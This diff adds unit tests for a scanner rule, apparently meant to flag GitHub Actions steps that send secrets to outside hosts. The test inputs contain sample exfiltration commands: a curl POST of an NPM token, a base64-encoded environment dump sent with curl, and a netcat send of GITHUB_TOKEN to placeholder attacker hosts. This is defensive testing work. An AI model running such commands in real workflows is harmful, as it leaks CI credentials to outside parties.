@@ -730,3 +730,25 @@ class SshInImageRule(unittest.TestCase):
             self.assertIn("ACR-DOCKER-010", ids("Dockerfile", f"FROM a:1\n{line}\nUSER 1\n", df), line)
         for line in ("RUN apk add --no-cache openssh-client", "EXPOSE 2222", "EXPOSE 8022"):
             self.assertNotIn("ACR-DOCKER-010", ids("Dockerfile", f"FROM a:1\n{line}\nUSER 1\n", df), line)
+
+
+class SecretExfilRule(unittest.TestCase):
+    def test_secret_posted_to_an_external_host(self):
+        gha = {"github-actions"}
+        head = "permissions: {}\njobs:\n  a:\n    steps:\n      - run: |\n"
+        self.assertIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                         head + "          curl -s -X POST -d \"${{ secrets.NPM_TOKEN }}\" https://font-cdn.example/collect\n", gha))
+        self.assertIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                         head + "          env | base64 | curl -d @- https://evil.example/x\n", gha))
+        self.assertIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                         head + "          nc attacker.example 4444 <<< \"$GITHUB_TOKEN\"\n", gha))
+
+    def test_secrets_to_github_and_plain_downloads_are_fine(self):
+        gha = {"github-actions"}
+        head = "permissions: {}\njobs:\n  a:\n    steps:\n      - run: |\n"
+        self.assertNotIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                            head + "          curl -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" https://api.github.com/repos/o/r/releases\n", gha))
+        self.assertNotIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                            head + "          curl -sSfL -o kind https://kind.sigs.k8s.io/dl/v0.33.0/kind-linux-amd64\n", gha))
+        self.assertNotIn("ACR-GHA-014", ids(".github/workflows/x.yml",
+                                            "permissions: {}\njobs:\n  a:\n    steps:\n      - run: echo done\n        env:\n          TOKEN: ${{ secrets.T }}\n", gha))
